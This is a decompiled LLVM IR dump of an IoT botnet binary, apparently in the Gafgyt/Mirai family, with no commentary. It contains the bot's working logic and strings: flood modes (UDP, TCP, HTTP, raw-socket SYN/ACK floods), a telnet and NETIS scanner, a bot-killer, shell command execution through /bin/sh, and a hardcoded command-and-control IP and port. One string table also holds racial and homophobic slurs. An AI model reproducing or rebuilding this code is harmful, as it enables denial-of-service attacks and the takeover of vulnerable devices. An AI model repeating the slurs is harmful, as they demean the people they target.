@global_var_20f30.1111 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_20f7c.1112 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_20fc8.1113 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_21018.1114 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_21060.1115 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_210b4.1116 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_21104.1117 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_2114c.1118 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_21198.1119 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_211e4.1120 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_2122c.1121 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_2127c.1122 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_212cc.1123 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_21300.1124 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_21334.1125 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_2137c.1126 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_2001c.1064, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_2005c.1065, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_2009c.1066, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_2012c.1067, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_20164.1068, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_20184.1069, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_2019c.1070, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_201f4.1071, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_20294.1072, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_202e8.1073, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_2035c.1074, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_2039c.1075, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_20454.1076, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_204a8.1077, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_20500.1078, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_20558.1079, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_20598.1080, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_205e0.1081, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_20638.1082, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_206a4.1083, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_206fc.1084, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_2074c.1085, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_20770.1086, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_207cc.1087, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_207dc.1088, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_2080c.1089, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_20830.1090, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_20854.1091, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_20870.1092, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_208b0.1093, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_2093c.1094, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_20984.1095, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_209cc.1096, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_20a14.1097, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_20a5c.1098, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_20ab0.1099, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_20b00.1100, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_20b6c.1101, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_20bc0.1102, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_20c1c.1103, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_20c78.1104, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_20cdc.1105, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_20d38.1106, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_20d94.1107, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_20df0.1108, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_20e50.1109, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_20e98.1110, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_20f30.1111, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_20f7c.1112, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_20fc8.1113, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_21018.1114, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_21060.1115, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_210b4.1116, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_21104.1117, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_2114c.1118, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_21198.1119, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_211e4.1120, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_2122c.1121, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_2127c.1122, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_212cc.1123, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_21300.1124, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_21334.1125, i32 0, i32 0)]
@global_var_1fff4.1128 = constant [6 x i8] c"close\00"
@global_var_1fffc.1129 = constant [11 x i8] c"keep-alive\00"
@global_var_20008.1130 = constant [7 x i8] c"accept\00"
@global_var_20010.1131 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1fff4.1128, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1fffc.1129, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_20008.1130, i32 0, i32 0)]
@global_var_21474.1135 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_214b4.1137 = constant [6 x i8] c"arfgG\00"
@global_var_214bc.1138 = constant [9 x i8] c"HBiug655\00"
@global_var_214c8.1139 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_214d8.1140 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_214ec.1141 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_21500.1142 = constant [12 x i8] c"GJjyur67458\00"
@global_var_2150c.1143 = constant [12 x i8] c"RYSDk747586\00"
@global_var_21518.1144 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_21524.1145 = constant [10 x i8] c"KHGK7985i\00"
@global_var_21530.1146 = constant [11 x i8] c"yuituiILYF\00"
@global_var_2153c.1147 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_2154c.1148 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_21558.1149 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_21568.1150 = constant [9 x i8] c"ewqdcftr\00"
@global_var_21574.1151 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_21584.1152 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_21590.1153 = constant [12 x i8] c"twehgbferhb\00"
@global_var_2159c.1154 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_215a8.1155 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_215b8.1156 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_215c8.1157 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_215d8.1158 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_215e4.1159 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_215f4.1160 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_21604.1161 = constant [12 x i8] c"yteytietyue\00"
@global_var_21610.1162 = constant [9 x i8] c"qsortEQS\00"
@global_var_2161c.1163 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_2162c.1164 = constant [4 x i8] c"std\00"
@global_var_21630.1165 = constant [4 x i8] c"dts\00"
@global_var_21634.1166 = constant [6 x i8] c"hackz\00"
@global_var_2163c.1167 = constant [7 x i8] c"shdyed\00"
@global_var_21644.1168 = constant [5 x i8] c"http\00"
@global_var_2164c.1169 = constant [10 x i8] c"sghwiondc\00"
@global_var_21658.1170 = constant [7 x i8] c"nigger\00"
@global_var_21660.1171 = constant [6 x i8] c"pussy\00"
@global_var_21668.1172 = constant [7 x i8] c"faggot\00"
@global_var_21670.1173 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_214b4.1137, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_214bc.1138, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_214c8.1139, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_214d8.1140, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_214ec.1141, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21500.1142, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2150c.1143, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21518.1144, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21524.1145, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21530.1146, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_2153c.1147, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2154c.1148, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21558.1149, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21568.1150, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_21574.1151, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21584.1152, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21590.1153, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2159c.1154, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_215a8.1155, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_215b8.1156, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_215c8.1157, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_215d8.1158, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_215e4.1159, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_215f4.1160, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21604.1161, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21610.1162, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_2161c.1163, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2162c.1164, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21630.1165, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21634.1166, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_2163c.1167, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21644.1168, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2164c.1169, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21658.1170, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21660.1171, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21668.1172, i32 0, i32 0)]
@global_var_21700.1176 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_2171c.1178 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_21740.1183 = constant [4 x i8] c"all\00"
@global_var_21744.1185 = constant i32 44
@global_var_21748.1187 = constant [4 x i8] c"syn\00"
@global_var_2174c.1189 = constant [4 x i8] c"rst\00"
@global_var_21750.1191 = constant [4 x i8] c"fin\00"
@global_var_21754.1193 = constant [4 x i8] c"ack\00"
@global_var_21758.1195 = constant [4 x i8] c"psh\00"
@global_var_2175c.1197 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_21770.1201 = constant [6 x i8] c"PONG!\00"
@global_var_21778.1203 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_21784.1206 = constant [10 x i8] c"My IP: %s\00"
@global_var_21790.1208 = constant [8 x i8] c"BOTKILL\00"
@global_var_21798.1210 = constant [13 x i8] c"Killing Bots\00"
@global_var_217a8.1212 = constant [7 x i8] c"LOOPME\00"
@global_var_217b0.1214 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_217c0.1216 = constant [7 x i8] c"TELNET\00"
@global_var_217c8.1218 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_217d8.1220 = constant [4 x i8] c"OFF\00"
@global_var_31850.1222 = global i32 0
@global_var_217dc.1224 = constant [5 x i8] c" OFF\00"
@global_var_217e4.1226 = constant [3 x i8] c"ON\00"
@global_var_217e8.1228 = constant [6 x i8] c"NETIS\00"
@global_var_217f0.1230 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_2180c.1232 = constant [5 x i8] c"HOLD\00"
@global_var_21814.1235 = constant [5 x i8] c"JUNK\00"
@global_var_2181c.1237 = constant [4 x i8] c"UDP\00"
@global_var_21820.1239 = constant [5 x i8] c"HTTP\00"
@global_var_21828.1241 = constant [4 x i8] c"CNC\00"
@global_var_2182c.1243 = constant [6 x i8] c"COMBO\00"
@global_var_21834.1245 = constant [4 x i8] c"STD\00"
@global_var_21838.1247 = constant [4 x i8] c"TCP\00"
@global_var_2183c.1249 = constant [5 x i8] c"STOP\00"
@global_var_21844.1253 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_2b1cc.1256 = local_unnamed_addr global i32 -1
@global_var_1ca20.1258 = constant [15 x i8] c"191.96.249.102\00"
@global_var_2b098.1259 = global [15 x i8]* @global_var_1ca20.1258
@global_var_2b09c.1261 = local_unnamed_addr global i32 987
@global_var_21850.1263 = constant [8 x i8] c"8.8.8.8\00"
@global_var_21858.1266 = constant [16 x i8] c"/proc/net/route\00"
@global_var_21868.1268 = constant [11 x i8] c"\0900000000\09\00"
@global_var_2b5dc.1270 = global i32 0
@global_var_21874.1272 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_21884.1274 = constant [7 x i8] c"SERVER\00"
@global_var_2188c.1276 = constant [7 x i8] c"ROUTER\00"
@global_var_21894.1278 = constant i32 0
@global_var_21898.1281 = constant [5 x i8] c"sshd\00"
@global_var_218a0.1283 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_2b1c8.1285 = global i32 1
@global_var_218b4.1288 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_218c4.1290 = constant i32 47
@global_var_21944.1293 = constant [9 x i8] c"VOIDV1.0\00"
@global_var_218c8.1295 = constant i32 993090331
@global_var_21950.1300 = constant [5 x i8] c"PONG\00"
@global_var_21958.1302 = constant [4 x i8] c"DUP\00"
@global_var_2195c.1304 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant [3 x i32] %wide-string
@global_var_21968.1308 = constant i32 32
@global_var_2b254 = external global i32
@global_var_2b25c = external local_unnamed_addr global i32
@global_var_31820.1318 = global i32 0
@global_var_21f6c.1323 = constant i32 0
@global_var_2b278.1325 = global i32 0
@global_var_2b290.1327 = global i32 0
@global_var_2b274.1329 = global i32* bitcast (i8** @global_var_2b2ac.1313 to i32*)
@global_var_146f4.1332 = constant i32 -382910448
@global_var_17dc0.1333 = constant i32 -382909968
@global_var_17e7c.1338 = constant i32 -382910224
@global_var_21fa0.1340 = constant i32 135270416
@global_var_21f84.1342 = constant [6 x i8] c"(nil)\00"
@global_var_21f8c.1345 = constant [7 x i8] c"(null)\00"
@global_var_21f94.1347 = constant i32 2949163
@global_var_22020.1350 = constant i32 16843008
@global_var_22008.1352 = constant i32 327688
@global_var_22000.1357 = constant [8 x i8] c" +0-#'I\00"
@global_var_21fa8.1359 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_21fe8.1361 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_21fdb.1363 = constant i32 117506048
@global_var_21fdc.1365 = constant i32 252117248
@global_var_21fcc.1367 = constant i32 331776
@global_var_21fbc.1369 = constant i32 335616
@global_var_1579c.1370 = constant i32 -456978431
@global_var_2203c.1376 = constant [8 x i8] c"Success\00"
@global_var_2202c.1378 = constant [15 x i8] c"Unknown error \00"
@global_var_22d76.1380 = constant i32 65536
@global_var_2b590.1381 = global i32* @global_var_22d76.1380
@global_var_315f4.1383 = global i32 0
@global_var_22c20.1386 = constant [15 x i8] c"Resolver error\00"
@global_var_22ba0.1388 = constant [8 x i8] c"Error 0\00"
@global_var_22ba8.1389 = constant [13 x i8] c"Unknown host\00"
@global_var_22bb8.1390 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_22bd4.1391 = constant [21 x i8] c"Unknown server error\00"
@global_var_22bec.1392 = constant [32 x i8] c"No address associated with name\00"
@global_var_22c0c.1393 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22ba0.1388, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_22ba8.1389, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_22bb8.1390, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_22bd4.1391, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_22bec.1392, i32 0, i32 0)]
@global_var_22c30.1395 = constant [3 x i8] c": \00"
@global_var_22c32.1397 = constant i32 0
@global_var_2b268 = external local_unnamed_addr global i32
@global_var_22b98.1402 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_315f8.1404 = global i32 0
@global_var_317d4.1406 = global i32 0
@global_var_31608.1408 = global i32 0
@global_var_2b598.1410 = global i32 0
@global_var_3190c.1415 = global i32 0
@global_var_31900.1418 = global i32 0
@global_var_31858.1420 = global i32 0
@global_var_317e8.1422 = global i32 0
@global_var_2b498.1425 = global i32 256
@global_var_2b39c.1426 = global i32* @global_var_2b498.1425
@global_var_31810.1429 = global i32 0
@global_var_318d8.1431 = global i32 0
@global_var_17bd4.1432 = constant i32 -382910416
@global_var_16844.1439 = constant i32 -442564520
@global_var_2b4a4.1441 = global i32 0
@global_var_14360.1443 = constant i32 -481230848
@global_var_31800.1445 = global i32 0
@global_var_13fe4.1447 = constant i32 -509587456
@global_var_2b4bc.1449 = global i32 0
@global_var_2b4d4 = external global i32
@global_var_2b4f4.1455 = global i32 -1726662223
@global_var_2b4dc.1462 = local_unnamed_addr global i32* @global_var_2b4f4.1455
@global_var_2b4d8.1464 = global i32* @global_var_2b4f4.1455
@global_var_22c34.1478 = constant i32 0
@global_var_1f31d.1482 = constant [10 x i8] c"erpc440fp\00"
@global_var_22c5c.1486 = constant [8 x i8] c"/bin/sh\00"
@global_var_22c64.1488 = constant [3 x i8] c"sh\00"
@global_var_22c68.1490 = constant [3 x i8] c"-c\00"
@global_var_2b570.1494 = global i32 0
@global_var_31804.1498 = local_unnamed_addr global i32 0
@global_var_1463c.1501 = constant i32 -382910416
@global_var_3180c.1503 = global i32 0
@global_var_2b074.1506 = global i32 -1
@global_var_31814.1509 = global i32 0
@global_var_31818.1511 = local_unnamed_addr global i32 0
@global_var_176c4.1512 = constant i32 -390234096
@global_var_22c6c.1514 = constant [10 x i8] c"/dev/null\00"
@global_var_3181c.1516 = global i32 0
@global_var_31808.1521 = local_unnamed_addr global i32 0
@global_var_15710.1524 = constant i32 -369095454
@global_var_2b588 = external local_unnamed_addr global i32
@global_var_14460.1535 = constant i32 -442564608
@global_var_1798c.1537 = constant i32 -335544701
@global_var_17ac4.1540 = constant i32 -275775369
@global_var_31844.1542 = global i32 0
@global_var_31824.1544 = global i32 0
@global_var_22f78.1548 = constant [4 x i8] c"inf\00"
@global_var_22f8c.1551 = constant i32 1076101120
@global_var_22f7b.1556 = constant i32 1179535616
@global_var_22f88.1558 = constant i32 2883630
@global_var_31828.1566 = global i32 0
@global_var_31840.1571 = local_unnamed_addr global i32 0
@global_var_14064.1576 = constant i32 -382910448
@global_var_31910.1579 = global i32 0
@global_var_22fd4.1581 = constant i32 46
@global_var_318f0.1583 = global i32 0
@global_var_167c4.1585 = constant i32 -481296384
@global_var_19924.1586 = constant i32 -369098656
@global_var_22fd8.1593 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_22fec.1595 = constant i32 114
@global_var_22ff0.1597 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_23008.1600 = constant [11 x i8] c"nameserver\00"
@global_var_23014.1603 = constant [7 x i8] c"domain\00"
@global_var_2301c.1605 = constant [7 x i8] c"search\00"
@global_var_31914.1610 = global i32 0
@global_var_31918.1612 = global i32 0
@global_var_2f5ec.1619 = global i32 0
@global_var_19fd4.1621 = constant i32 -442564544
@global_var_2f5f0.1623 = global i32 0
@global_var_20003.1631 = constant [4 x i8] c"ive\00"
@global_var_20000.1632 = constant [7 x i8] c"-alive\00"
@global_var_2b2a8.1635 = global i32 2
@global_var_1a4b0.1641 = constant i32 -442564492
@global_var_23038.1670 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_23024.1672 = constant i32 0
@global_var_2304c.1675 = constant [3 x i8] c"%x\00"
@global_var_23050.1678 = constant [11 x i8] c"/etc/hosts\00"
@global_var_2305c.1680 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1a73c.1684 = constant i32 -382908944
@global_var_1c178.1686 = constant i32 -504313148
@global_var_1c160.1687 = constant i32 -483131392
@global_var_1c020.1688 = constant i32 -481294847
@global_var_1c1d8.1689 = constant i32 -477821825
@global_var_1c2d8.1690 = constant i32 -476034303
@global_var_1c5c4.1691 = constant i32 -516685812
@global_var_1c4c8.1692 = constant i32 -905969576
@global_var_1c644.1693 = constant i32 -478149505
@global_var_1c62c.1694 = constant i32 -534773758
@global_var_1c5e0.1695 = constant i32 -534773758
@global_var_1c578.1696 = constant i32 -483131392
@global_var_2b078.1698 = global i32 0
@global_var_2b5b4.6 = external global i8*
@global_var_2b5e2.68 = external global i8*
@global_var_2b5e3.69 = local_unnamed_addr global i8 0
@global_var_2b5e4.70 = local_unnamed_addr global i8 0
@global_var_2b5e5.71 = local_unnamed_addr global i8 0
@global_var_2b5e6.72 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c" \01\00"
@global_var_2b2ac.1313 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_2b2fc.1314 = local_unnamed_addr global i8 16
@global_var_2b2ad.1320 = local_unnamed_addr global i8 1
@global_var_2b2fd.1321 = local_unnamed_addr global i8 1
@global_var_176d8.1331 = constant i8 0
@3 = internal constant [2 x i8] c"\01\00"
@global_var_2b594.1573 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_2b595.1574 = local_unnamed_addr global i8 0
@global_var_21964.1306 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_2b5b4.6 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_2b5b4.6 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_2b090.9 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_2b090.9 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_2b090.9 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_2b090.9 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_2b5b4.6 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
